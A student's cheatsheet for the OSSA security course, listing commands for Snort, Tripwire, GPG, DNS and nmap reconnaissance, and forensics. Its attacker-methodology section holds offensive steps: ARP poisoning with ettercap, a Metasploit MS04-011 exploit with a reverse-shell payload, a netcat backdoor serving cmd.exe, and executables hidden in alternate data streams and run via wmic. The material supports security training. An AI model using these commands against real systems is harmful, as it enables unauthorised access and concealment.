# CHEATSHEET FOR OSSA COURSE 

## Other notes sources
- https://github.com/PlatyPew/OSSA-Notes/tree/master
- https://github.com/perxpective/Cybersecurity-Therapy/blob/main/Others/OSSA/OSSA%20Summary.md
- https://github.com/exetr/OSSA-Notes

## Things to take note 
- run `tar zxvf` to install tar packages
- run `rpm -i` to install rpm packages
- most tools in Win7/Centos7

## Part 1: What is Information Security
```
no commands to take note of
```
## Part 2: Defending Your Turf & Securing Policy Formulation
```
no commands to take note of
```
## Part 3: Network 101

**SSH**
- use putty (port 22)
**SFTP**
```
sftp user@ipaddress
```
- `get <filename>` to download file
- `bye` to leave

## Part 4: Defence Tools & Lockdown 

### Firewall

- fwbuilder is in Centos7 OS

### NIDS (Snort)

- Check Snort Configuration File
`look out for HOME_NET for ip address range to be monitored`
```
nano /etc/snort/snort.conf
```
- Starting Snort
```
snort -c /etc/snort/snort.conf &
```
- Starting Snort (with alert onscreen)
```
snort -A console -c /etc/snort/snort.conf &
```
- View Alert Logs
`-f keeps tail open and see live updates to file`
```
tail -f /var/log/snort/alert
```

### HIDS (Tripwire)

- Prepare tripwire config file
```
tripwire-setup-keyfiles
```
- Take a snapshot of filesystem using Tripwire
```
tripwire --init
```
- Check any changes to filesystem
```
tripwire --check
```
- View tripwire report
`<filename> is hostname of server and <timestamp> is timestamp file is created`
```
twprint -m r --twrfile /var/lib/tripwire/report/<filename>-<timestamp>.twr
```
- Policies can be edited on the Tripwire Policy text file: `twpol.txt`

- Update the Tripwire database whenever `twpol.txt` was edited
```
tripwire --update --twrfile /var/lib/tripwire/report/<filename>
```

### GPG Encryption & Verification

- Generate new GPG keypair
```
gpg --gen-key
```
- Import Public Key
`<filename> is name of file containing public key of 3rd party to import`
```
gpg --import <filename>
```
- View imported keys
`<keyid> is the string of number after /`
```
gpg --fingerprint
```
- Sign imported key to verify source of public key
```
gpg --sign-key <keyid>
```
- Verify authenticity of files sign by 3rd party private key
`<filename1> is public signature by originator of file & <filename2> is file whose integrity to be verified`
```
gpg --verify <filename1> <filename2>
```

## Part 5: The 5E Attacker Methodology

### Exploration 
**DNS Reconnaissance**

- Find IP address of server
```
dig securitystartshere.org
```
**dig options (add after):**
- `mx` - find **mail exchanger** records
- `ns` - find **name server** records 
- `soa` - find **SOA (Start of Authority)** 
    - stores information about the name of the server, zone administrator, current version of zone data file etc.

- Perform a zone transfer of the pod's DNS internal server
```
dig @10.50.8.1 pod8.com axfr
```

**Whois Reconnaissance**

- Find where domain is registered
```
whois securitystartshere.org
```

### Enumeration  
**Port Scanning**

- Ping Sweep to determine how many host(s) in subnet
```
nmap -sP -n 10.50.8.0/24
```
- SYN Stealth Scan
    - Sends SYN packets
    - If host replies with SYN/ACK, RST is sent to stop 3-way handshake from continuing. Reports as open
    - If host replies with RST, nmap reports as closed
    - If host no reply, nmap reports as filtered
```
nmap -sS -vv --reason 10.50.8.0
```
- Suggested SYN scan
```
nmap -sS -n -Pn -vv -p<target port range> -g<source port range> <target IP address> --max-retries=<value> --min-parallelism=<value> --max-rtt-timeout=<value>ms
```
- ACK Scan
    - to determine if there is any firewall protecting the target
    - ACK packet is sent
    - RST packet is returned because session for ACK packet does not exist
```
nmap -sA 10.50.8.0
```
- Service version detection scan
```
nmap -sV -Pn -n -p80,135-139,445 -vv 10.50.8.3
```
- Nmap results
    - Open: Port is open and accepting requests
    - Closed: Port is accessible but no services are listening on it (RST packet received)
    - Filtered: Port cannot be determined open as packets are not reaching host. This usually denotes a firewall on the port which drops packets.

- Other Nmap options can be found on Nmap cheatsheets :?

**OS Determination**

- Determine OS of IP address
```
xprobe2 10.50.8.1
```

**Network Mapping**
`in FC5 VM`
- run Cheops-ng
```
cheops-agent -n
``` 
- In GUI
    - enter `127.0.0.1` in agent hostname so server is listening on same station
    - Go `Viewspace` and `Add Network` to put network range (add network range `10.50.8.0` and netmask `255.255.255.0`)
    - Go `Map` and `Map Everything` for it to check enter network for host and render network topology

**Vulnerability Scanning**
Nessus
- Refer to book :? (Blue Highlight)

**Web Scanning**
HTTPrint -> web server fingerprinting tool

- Run HTTPrint
```
./httprint -h http://10.50.8.3 -s <full path to signatures.txt file plus the file itself>
```
`may want to look at Nikto too`

### Exploitation
**ARP Spoofing**
- Before using ettercap
    - `route -n` to get internet gateway IP address

- Start ettercap
```
ettercap -G
```
- ettercap usage
    - Scan for host `Host -> scan for hosts`
    - `-> hosts list`
        - add target IP as target 1 & internet gateway IP as target 2
    - `-> Current Targets` 
        - to confirm targets
    - `Start -> Start Sniffing`
    - `MITM -> ARP poisoning`
        - check `Sniff remote connections`
    - `View -> Connections`
        - see active connections
    - DONT FORGET TO STOP MITM ATTACK

- ARP flush
```
arp -d 192.168.1.1
```

**SSL Man-In-The-Middle(MITM)**
Burpsuite
- Refer to book :? (Green Highlight)

**Web Application Exercise**
Burpsuite
- Refer to book :? (Green Highlight)

**Metasploit Framework**
- Run Metasploit (in directory)
```
msfconsole.exe
```
- In Metasploit
    - `show exploits` to show exploits
    - `use windows/smb/ms04_011_lsass` to pick exploit `MS04_011_Lsass` 
    - `show options` set params for exploit
    - `set RHOST <ipaddr>` set target ip
        - `set TARGET 0`
    - `show payloads` to show payloads
        - `set payload windows/shell_reverse_tcp` to set reverse shell payload
    - `exploit` to run exploit

**Password_cracking**

- Use OPHCrack/ John the Ripper

### Embedding
**Backdooor Deployment**
Netcat

- Create remote shell as backdoor
```
nc -l -p 48800 -e <windows directory name>\system32\cmd.exe
```
- Connect to backdoor
```
nc <ip address> 48800
```
### Egress
**File hiding using Alternate Data Streams**
- Using the `type` command to stream (hide) a file:
```
type c:\6\nc.exe . c:\hobbit.txt:hidenc.exe
```

- To run the streamed (hidden) executable:
```
wmic process call create c:\<full file path>:hidenc.exe
```

- Streaming (hiding) a text file:
```
notepad c:\<full file path>:hidden.txt
```
**File hiding using Steganography**
- Using S-Tools
    - try guess using different encryption algo

## Part 6: Wireless Insecurity
```
no commands to take note of
```
## Part 7: Incident Response & Computer Forensics
**Discover, Recover & Identify Deleted Files**

- Option 1 > 
    - Mount .dd image file using OSFMount software in Win7 VM
    - Open disk-investigator.exe
        - go `Directories`
        - go drive @ files 
            - click `FILE -> UNDELETE`
        - open new file check header
            - refer to https://www.garykessler.net/library/file_sigs.html
            - can also use https://hexed.it/

- Option 2 > 
    - Open foremost
    - move .dd file in directory fore foremost
    - Run foremost to extract deleted files
    ```
    foremost -T -i usb.dd
    ```
    - file check header
        - refer to https://www.garykessler.net/library/file_sigs.html
        - can also use https://hexed.it/

**Browser Forensic Analysis**

Pasco
- copy all `index.dat` (cookie file) to directory where Pasco is
- extract info from cookie
```
pasco -d <index.dat_filename>
```
- extract info from cookie to new file
```
pasco -d <index.dat_filename> > <newfilenname>
```

Galleta
- copy all `administrator@yahoo[1].txt` (cookie file) to directory where Galleta is
- extract info from cookie
```
galleta <name_of_cookie>
```
- extract info from cookie to new file
```
galleta <name_of_cookie>> <newfilenname>
```

## Part 8: The Impact of Law
```
no commands to take note of
```
